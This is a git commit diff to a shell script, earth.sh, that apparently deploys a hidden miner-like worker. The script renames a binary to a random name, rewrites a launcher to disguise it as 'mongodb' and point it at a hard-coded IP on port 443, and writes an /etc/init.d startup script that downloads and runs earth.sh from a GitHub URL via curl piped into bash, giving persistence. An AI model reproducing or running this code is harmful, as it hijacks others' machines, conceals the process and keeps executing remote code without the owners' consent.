21468711e712c9f4322314db340e9a6b7219ae84
merisye <meriysella44@gmail.com>
2024-06-15 03:42:43 +0700

    Update earth.sh

--- earth.sh
+++ earth.sh
@@ -5,7 +5,7 @@ cd /grave
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv layer $variable1
 sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./shell.sh
-sed -i "s/host/20.163.170.215:443/g" ./shell.sh
+sed -i "s/host/139.59.98.146:443/g" ./shell.sh
 cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/toolsas/shard/main/earth.sh)" > stone.sh
 chmod a+x stone.sh
